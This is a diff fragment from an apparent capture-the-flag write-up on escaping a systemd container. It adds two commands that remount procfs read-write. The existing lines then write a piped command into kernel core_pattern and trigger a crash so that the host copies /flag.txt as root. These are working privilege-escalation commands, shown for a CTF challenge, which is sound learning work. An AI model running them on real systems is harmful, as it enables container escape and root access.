@@ -252,6 +252,8 @@ I know the author well enough to know that the intended solution is bpf fuckery 
 Systemd, by default, mounts procfs and sys as read-only. It does not prevent a user with the appropriate (and default) capabilities from mounting procfs again r/w. Once you have write access to procfs it's trivial to escalate privileges by modifying core_pattern.
 
 ```
+> mkdir proc
+> mount -t proc proc proc
 > echo '|/usr/bin/cp /flag.txt /var/lib/machines/ubuntu/flag.txt' > proc/sys/kernel/core_pattern
 ./crash
 > cat /flag.txt
